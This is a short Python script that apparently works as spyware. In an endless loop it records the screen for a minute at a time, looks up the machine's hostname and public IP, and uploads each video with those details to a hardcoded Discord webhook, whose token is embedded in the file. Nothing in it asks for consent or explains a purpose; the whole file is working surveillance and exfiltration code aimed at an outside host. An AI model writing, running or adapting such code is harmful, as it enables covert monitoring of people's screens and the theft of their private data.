import os
import json
import socket
import requests
import time as t
import pyscreenrec

# Setup
WEBHOOK = 'https://discord.com/api/webhooks/1377001596235550790/U35bN7Wpx81Qy-9s7qVubz9mGQQBzEyXCQ2vOHQD1CBP3eYRv0U-N53QdGYK5KKzu3HO'

def get_device_name():
    return socket.gethostname()

def get_ip():
    response = requests.get('https://api.ipify.org?format=json')
    ip = response.json()['ip']
    return ip


def send_screenshot(computer, ip):
    recorder = pyscreenrec.ScreenRecorder()
    recorder.start_recording("recording.mp4", 30)
    t.sleep(60)
    recorder.stop_recording()
    embed = {
        "title": "Screen Captured",
        "description": f"**Device:** `{computer}`\n**IP Address:** `{ip}`",
        "color": 0x3498db,
        "video": {
            "url": "attachment://recording.mp4"
        }
    }
    payload = {
        "embeds": [embed]
    }
    with open('recording.mp4', 'rb') as f:
        files = {
            'file': ('recording.mp4', f, 'video/mp4'),
            'payload_json': (None, json.dumps(payload), 'application/json')
        }
        requests.post(WEBHOOK, files=files)

while True:
    device = get_device_name()
    IPv4 = get_ip()
    for i in range(5):
        send_screenshot(device, IPv4)